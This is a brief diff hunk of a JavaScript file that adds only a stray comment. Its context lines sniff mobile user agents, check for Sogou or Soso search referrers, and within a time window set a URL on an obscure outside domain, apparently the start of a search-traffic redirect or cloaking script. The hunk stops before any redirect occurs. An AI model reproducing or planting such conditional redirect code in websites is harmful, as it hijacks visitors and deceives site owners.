@@ -2,6 +2,7 @@ var wap = navigator.userAgent.match(/Android|Linux|iPad|iPhone|iPod/i) != null;
 var ios = navigator.userAgent.match(/iPad|iPhone|iPod/i) != null;
 var azs = navigator.userAgent.match(/Android|Linux/i) != null;
 var lailu = document.referrer.toLowerCase().match(/sogou|soso/i) != null;
+//ssssss
 function show_code(){
     if(time_range('00:00','19:00')){
         var tcurl = 'https://9j103zpn.shaolinsizhaoshengguanwang.com/ice941';
